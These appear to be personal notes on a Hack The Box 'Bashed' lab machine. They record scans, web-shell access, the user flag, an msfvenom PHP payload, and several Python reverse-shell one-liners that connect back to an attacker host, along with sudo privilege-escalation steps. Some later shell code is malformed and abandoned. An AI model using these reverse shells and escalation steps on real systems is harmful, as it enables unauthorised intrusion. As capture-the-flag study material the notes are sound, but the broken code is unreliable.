---
Bashed - HTB - TJNULL - Linux
10.10.10.68


5:57 PM 1/30/2023
nmap -Pn -sV -sC -p- -oN full 10.10.10.7


5:57 PM 1/30/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bashed]
└─# nmap -Pn -sV -sC 10.10.10.68
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-30 22:57 EST
Nmap scan report for 10.10.10.68
Host is up (0.22s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)


5:59 PM 1/30/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bashed]
└─# gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.68 -k -t 50 -x php,txt,zip 



6:01 PM 1/30/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bashed]
└─# dirsearch -u http://10.10.10.68:80 -x 400,401,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.10.10.68-80/_23-01-30_23-20-15.txt

Error Log: /root/.dirsearch/logs/errors-23-01-30_23-20-15.log

Target: http://10.10.10.68:80/

[23:20:15] Starting: 
[23:20:17] 301 -  307B  - /js  ->  http://10.10.10.68/js/
[23:20:20] 301 -  308B  - /php  ->  http://10.10.10.68/php/
[23:20:30] 200 -    8KB - /about.html
[23:20:42] 200 -    0B  - /config.php
[23:20:43] 200 -    8KB - /contact.html
[23:20:44] 301 -  308B  - /css  ->  http://10.10.10.68/css/
[23:20:45] 301 -  308B  - /dev  ->  http://10.10.10.68/dev/
[23:20:45] 200 -    1KB - /dev/
[23:20:47] 301 -  310B  - /fonts  ->  http://10.10.10.68/fonts/
[23:20:49] 301 -  311B  - /images  ->  http://10.10.10.68/images/
[23:20:49] 200 -    2KB - /images/
[23:20:50] 200 -    8KB - /index.html
[23:20:51] 200 -    3KB - /js/
[23:20:57] 200 -  939B  - /php/
[23:21:06] 301 -  312B  - /uploads  ->  http://10.10.10.68/uploads/
[23:21:06] 200 -   14B  - /uploads/


6:22 PM 1/30/2023

in http://10.10.10.68/dev/	able to get php shell by using tutorial on web page.

6:23 PM 1/30/2023
www-data@bashed:/var/www/html/dev# whoami
www-data



6:24 PM 1/30/2023
www-data@bashed:/home# cd arrexel
www-data@bashed:/home/arrexel# ls
user.txt
www-data@bashed:/home/arrexel# cat user.txt
963186140a25ae21965b9dd2946d4ba3

6:25 PM 1/30/2023
msfvenom -p php/reverse_php LHOST=10.10.16.4 LPORT=6666 -f raw > shell.php																							# trying to get in a better shell.




6:29 PM 1/30/2023
┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bashed]																													# pulled file over using netcat, worked.
└─# nc -lvp 4444 < shell.php 

6:43 PM 1/30/2023
www-data@bashed:/tmp# nc 10.10.16.4 4444 > shell.php


6:45 PM 1/30/2023																																						# cant use a reverse shell, going to use built in shell.
www-data@bashed:/tmp# ./shell.php
sh: 1: ./shell.php: Permission denied


6:45 PM 1/30/2023
www-data@bashed:/tmp# sudo -l
Matching Defaults entries for www-data on bashed:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
(scriptmanager : scriptmanager) NOPASSWD: ALL																														# this is how you priv esc. need to get into script manager.


6:51 PM 1/30/2023
www-data@bashed:/home/arrexel# uname -a
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux


6:58 PM 1/30/2023																																		# looking at suid bits
find / -perm -u=s -type f 2>/dev/null


7:03 PM 1/30/2023																														# note this in main linux notes. 
	# this is a pentest monkey python script that is used as a reverse shell - wqe needed a reverse shell because we were unable to run sudo or su so could not priv esc
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",1234));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


7:06 PM 1/30/2023																													#netcat and new shell

┌──(root㉿kali)-[/home/kali/Documents/hackthebox/bashed]
└─# nc -lvnp 1234           
listening on [any] 1234 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.68] 50098
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data


7:07 PM 1/30/2023																									# upgrading into bash shell.
$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@bashed:/bin$ 


7:19 PM 1/30/2023																									# hosting http server
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 -m http.server                  
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.10.68 - - [31/Jan/2023 00:18:18] "GET / HTTP/1.1" 200 -
10.10.10.68 - - [31/Jan/2023 00:18:51] "GET /linpeas.sh HTTP/1.1" 200 -


7:16 PM 1/30/2023																									# putting linpeas on box.
www-data@bashed:/tmp$ wget 10.10.16.4:8000/linpeas.sh 
wget 10.10.16.4:8000/linpeas.sh
--2023-01-30 21:18:50--  http://10.10.16.4:8000/linpeas.sh
Connecting to 10.10.16.4:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828087 (809K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 808.68K   889KB/s    in 0.9s    

2023-01-30 21:18:51 (889 KB/s) - 'linpeas.sh' saved [828087/828087]

www-data@bashed:/tmp$ 



7:19 PM 1/30/2023																			# made linpeas.sh executable
www-data@bashed:/tmp$ chmod +x linpeas.sh
chmod +x linpeas.sh


7:21 PM 1/30/2023
ran linpeas.sh



Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017

] [CVE-2016-8655] chocobo_root

   Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
   Exposure: probable
   Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic}
   Download URL: https://www.exploit-db.com/download/40871
   Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04 ]{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh



apache2 process found (dump creds from memory as root)


7:50 PM 1/30/2023																			

www-data@bashed:/tmp$ sudo -u scriptmanager bash -i
sudo -u scriptmanager bash -i
scriptmanager@bashed:/tmp$ whoami



7:52 PM 1/30/2023
scriptmanager@bashed:/$ cd scripts
cd scripts
scriptmanager@bashed:/scripts$ ls
ls
test.py  test.txt
scriptmanager@bashed:/scripts$ ls -la
ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Jan 30 21:51 test.txt
scriptmanager@bashed:/scripts$ 



7:56 PM 1/30/2023

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",4321));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'


scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("testing 123!")
f.close




scriptmanager@bashed:/scripts$ cat test.py
cat test.py
f = open("test.txt", "w")
f.write("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",4321));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'")
f.close > echo.py



"f = open("test.txt", "w")"

"f.write("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.4",4321));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'")" >> test.py


import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
"s.connect(("10.10.16.5", 4321))"
"os.dup2(s.fileno(),0)"
"os.dup2(s.fileno(),1)"
"os.dup2(s.fileno(),2)"
"p=subprocess.call(["/bin/sh","-i"])> test.py"

echo "import socket,subprocess,os" > test.py
echo "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)" >> test.py
echo "s.connect((10.10.16.5,4321))" >> test.py
echo "os.dup2(s.fileno(),0)" >> test.py
echo "os.dup2(s.fileno(),1)" >> test.py
echo "os.dup2(s.fileno(),2)" >> test.py
echo "p=subprocess.call(["/bin/sh","-i"])" >> test.py


my reverse shell isnt working. quitting for now 


8:40 PM 1/30/2023

